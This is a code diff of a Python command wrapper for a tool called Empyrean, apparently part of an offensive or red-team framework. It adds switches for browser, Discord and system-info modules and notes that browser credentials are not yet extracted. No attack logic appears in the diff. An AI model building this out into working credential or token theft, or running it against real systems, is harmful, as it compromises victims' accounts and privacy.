@@ -1,7 +1,7 @@
 """
 Runs Empyrean.
 
-This is the executable-dependent version; it is NOT the Python native version.
+This is the Python native version.
 """
 
 from typing import Any, Optional, Type
@@ -18,6 +18,24 @@ class EmpyreanArguments(BaseModel):
     """
     Simple helper class used for holding arguments.
     """
+    exec_browser: bool = Field(
+        default=True,
+        json_schema_extra={
+            "description": "Whether to run the browser module."
+        }
+    )
+    exec_discord: bool = Field(
+        default=True,
+        json_schema_extra={
+            "description": "Whether to run the Discord module."
+        }
+    )
+    exec_sysinfo: bool = Field(
+        default=True,
+        json_schema_extra={
+            "description": "Whether to run the system info module."
+        }
+    )
 
 
 class EmpyreanResult(BaseModel):
@@ -28,13 +46,19 @@ class EmpyreanResult(BaseModel):
     success: bool = Field(
         json_schema_extra={
             "description": (
-                "Whether or not the command executed without exception. For"
-                " example, executing binaries that do not exist when shell=False"
-                " will raise FileNotFoundError, and this will be set to False."
+                "Whether or not Empyrean ran. False if not on Windows, or if the"
+                " executable was murdered before it could be run."
             )
         },
     )
-    output: dict[str, Any]
+    browser_output: dict[str, Any] = Field(
+        json_schema_extra={
+            "description": (
+                "Output of the browser module. Note that credentials are not currently"
+                " extracted."
+            )
+        },
+    )
 
 
 class EmpyreanCommand(CommandBase):
